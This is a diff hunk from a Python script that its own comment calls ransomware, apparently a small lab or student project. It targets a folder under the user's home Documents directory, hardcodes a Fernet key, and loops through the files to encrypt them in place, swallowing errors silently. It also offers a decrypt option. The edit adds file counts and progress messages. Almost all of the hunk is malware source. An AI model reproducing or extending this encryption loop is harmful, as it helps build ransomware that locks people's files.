@@ -23,26 +23,26 @@ def showMenu():
     return(int(input('Option: ')))
 
 #Configure starting path of the ransomware
-#path = Path().absolute()
-#foldername = path / 'arquivos'
 path = Path(Path.home()).absolute()
-foldername = path / 'Documents'/ 'LFA'
-#print(path)
-#print(getFiles(foldername))
+foldername = path / 'Documents' / 'LFA'
 files = getFiles(foldername)
 #Cryptography key
 fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')
 
+print('Calculating number of files..')
+size = len(files)
+print(f'Number of files: {size}\n')
+
 opt = showMenu()
 while opt != 9:
     if opt == 1: 
-        for x in files:
+        for index,x in enumerate(files):
+            print(f'Encrypting file {index + 1}/{size}')
             try: encrypt(x)
             except Exception: pass
     if opt == 2:
-        for x in files:
+        for index,x in enumerate(files):
+            print(f'Decrypting file {index + 1}/{size}')
             try: decrypt(x)
             except Exception: pass
     opt = showMenu()
-
-
